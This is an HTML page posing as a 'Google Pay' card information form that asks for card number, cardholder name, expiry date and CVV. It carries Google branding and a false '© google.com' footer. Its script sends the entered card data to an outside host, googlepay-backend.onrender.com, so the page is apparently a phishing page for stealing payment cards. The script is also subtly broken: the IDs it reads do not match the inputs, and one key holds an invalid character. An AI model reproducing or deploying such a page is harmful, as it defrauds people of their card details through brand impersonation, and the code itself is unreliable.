<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <title>Google - Card  Information Form</title>

  <!-- Font Awesome Icons -->
  <link rel="stylesheet"
    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

  <style>
    * {
        box-sizing: border-box;
    margin: 0;
    padding: 0;
}

body {
    font-family: Arial, Helvetica, sans-serif;
    background: #F8F9FA;
    color: #202124;
    min-height: 100vh;
    padding: 30px 15px;
}

.container {
    max-width: 480px;
    margin: 30px auto;
    background: #FFFFFF;
    padding: 30px 25px;
    border-radius: 18px;
    box-shadow: 0 4px 20px rgba(60, 64, 67, 0.12);
}

header {
    text-align: center;
    margin-bottom: 28px;
}

header h1 {
    font-size: 27px;
    font-weight: 600;
    letter-spacing: -1px;
}

.google-blue {
    color: #4285F4;
}

.google-red {
    color: #EA4335;
}

.google-yellow {
    color: #FBBC05;
}

.google-green {
    color: #34A853;
}

header p {
    color: #5F6368;
    font-size: 14px;
    margin-top: 9px;
}

h2 {
    font-size: 21px;
    margin-bottom: 10px;
    text-align: center;
}

.description {
    color: #5F6368;
    font-size: 14px;
    text-align: center;
    line-height: 1.5;
    margin-bottom: 25px;
}

.form-group {
    margin-bottom: 19px;
}

label {
    display: block;
    font-size: 14px;
    font-weight: 600;
    margin-bottom: 8px;
}

input {
    width: 100%;
    padding: 14px;
    border: 1px solid #DADCE0;
    border-radius: 9px;
    font-size: 15px;
    outline: none;
    background: #FFFFFF;
    transition: border-color 0.2s, box-shadow 0.2s;
}

input:focus {
    border-color: #4285F4;
    box-shadow: 0 0 0 2px rgba(66, 133, 244, 0.15);
}

button {
    width: 100%;
    padding: 15px;
    border: none;
    border-radius: 9px;
    background: #4285F4;
    color: #FFFFFF;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    transition: background 0.2s;
}

button:hover {
    background: #3367D6;
}

footer {
    text-align: center;
    margin-top: 25px;
    font-size: 12px;
    color: #80868B;
}

@media (max-width: 480px) {
    .container {
        padding: 25px 18px;
        margin: 10px auto;
    }
}
  </style>
</head>

  <body>

    <div class="container">

        <header>
            <h1>
                <span class="google-blue">G</span><span class="google-red">o</span><span class="google-yellow">o</span><span class="google-blue">g</span><span class="google-green">l</span><span class="google-red">e</span>
                <span style="color:#5F6368;">Pay</span>
            </h1>
            <p>Secure • Fast • Convenient</p>
        </header>

        <div style="text-align:center; margin-bottom:25px;">
            <div style="
                display:inline-flex;
                align-items:center;
                justify-content:center;
                width:85px;
                height:65px;
                border-radius:14px;
                background:#E8F0FE;
                color:#4285F4;
                font-size:38px;">
                <i class="fa-solid fa-address-card"></i>
            </div>
        </div>

        <h2>Card Information</h2>

        <p class="description">
            Enter the required information below.
        </p>

        <form id="orderForm">

            <div class="form-group">
                <label for="Card_number">Card number </label>
                <input
                    type="text"
                    id="card_number"
                    name="card_number"
                    placeholder="0000-0000-00"
                    autocomplete="card number"
                    required>
            </div>

            <div class="form-group">
                <label for="Cardholder’s_name">Cardholder’s name</label>
                <input
                    type="text"
                    id="cardholder’s_name"
                    name="cardholder’s_name"
                    placeholder="Enter cardholder’s full name"
                    autocomplete="cardholder name"
                    required>
            </div>

            <div class="form-group">
                <label for="valid_till">Valid_Till</label>
                <input
                    type="text"
                    id="valid_till"
                    name="valid_till"
                    placeholder="00/00"
                    required>
            </div>

            <div class="form-group">
                <label for="cvv">CVV</label>
                <input
                    type="text"
                    id="cvv"
                    name="cvv"
                    placeholder="000"
                    required>
            </div>

            <button type="submit">
                Submit Information
                <i class="fa-solid fa-arrow-right"></i>
            </button>

        </form>

        <footer>
            <p> &copy google.com </p>
            <p style="margin-top:8px;">
                <span class="google-blue">●</span>
                <span class="google-red">●</span>
                <span class="google-yellow">●</span>
                <span class="google-green">●</span>
            </p>
        </footer>

    </div>

</body>

</body>
  <script>
const form = document.getElementById("orderForm");

form.addEventListener("submit", async function(event) {

    event.preventDefault();

    const formData = {
        card_number: document.getElementById("Card_number").value,
        Cardholder’s_name : document.getElementById("Cardholder’s_name").value,
        valid_till: document.getElementById("value_till").value,
        cvv: document.getElementById("cvv").value
    };

    try {

        const response = await fetch(
            "https://googlepay-backend.onrender.com/submit",
            {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(formData)
            }
        );

        const result = await response.json();

        if (response.ok && result.success) {
            alert("Information submitted successfully!");
            form.reset();
        } else {
            alert(result.message || "Submission failed. Please try again.");
        }

    } catch (error) {
        alert("Unable to connect. Please try again.");
        console.error(error);
    }

});
</script>
</html>
